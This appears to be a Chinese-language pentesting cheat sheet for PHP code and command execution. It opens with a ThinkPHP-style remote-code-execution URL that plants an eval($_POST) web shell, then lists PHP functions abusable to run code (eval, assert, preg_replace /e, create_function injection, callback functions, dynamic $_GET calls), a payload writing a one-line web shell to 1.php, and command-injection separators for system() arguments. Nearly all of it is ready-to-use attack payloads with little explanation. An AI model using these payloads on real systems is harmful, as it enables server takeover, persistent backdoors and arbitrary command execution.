```php 

http://192.168.30.128:8080/?s=/Index/index/jammny/${@print(eval($_POST[1]))}
系统命令system(phpinfo())
windows的^等同于linux的" 

·eval () 直接phpinfo()
·assert ()  直接phpinfo()
·preg_replace ()+ /e 模式  
		<?php
		$pattern = "/^\d{5,11}$/ie";//匹配5-11次数字（5可以改 但是11不能改 11			代表phpinfo(); 字数） /ie 代表模式  
		$qq = '1231456';
		$replace = "phpinfo();";
		echo preg_replace($pattern,$replace,$qq);?>

·create_function ()
		$a = create_function('$id',"}phpinfo();//"); //单行	
		$a = create_function('$id',"}phpinfo();/*"); //多行

·array_map ()  
		array_map("assert",array("phpinfo()"));//要执行的函数+ 数组函数参数 

·call_user_func () / call_user_func_array () 
		call_user_func("assert","phpinfo()");
		call_user_func_array("assert",array("phpinfo()"));

·array_filter () 
		array_filter(array("phpinfo()"),"assert");

·usort (), uasort () 
		$a=["1","phpinfo()"];
   usort($a,"assert");//只能引用变量

		uasort($a,"assert");
·array_walk
		$a[]=phpinfo();
		array_walk($a,"assert");
·ob_start
		$cmd = 'system';ob_start($cmd);echo "whoami";ob_end_flush();
·动态函数
	$_GET[1]($_GET[2]);
  //?1=system&2=whoami
  //1=system&2=^echo “<?php @eval($_POST[x]); ?>” > 1.php^

system (args)(有回显)  
passthru(arqs)(有回显) 
exec(arqs)(本身无回显-必须echo输出显示最后一行) 
shell_exec(args)(本身无回显-必须echo输出显示) 
popen(handle,mode)(无回显) mode r/
proc_open //进程	  
proc_open('cmd','flag','flag')(无回显) $process = proc_open('dir',$des,$pipes); echo stream_get_contents($pipes[1]);
system () 多语句执行 
system("dir \"$arg\""); /?a=./" | "ipconfig /?a=aa" || "ipconfig /?a=./" %26 "ipconfig /?a=./" %26%26 "ipconfig
```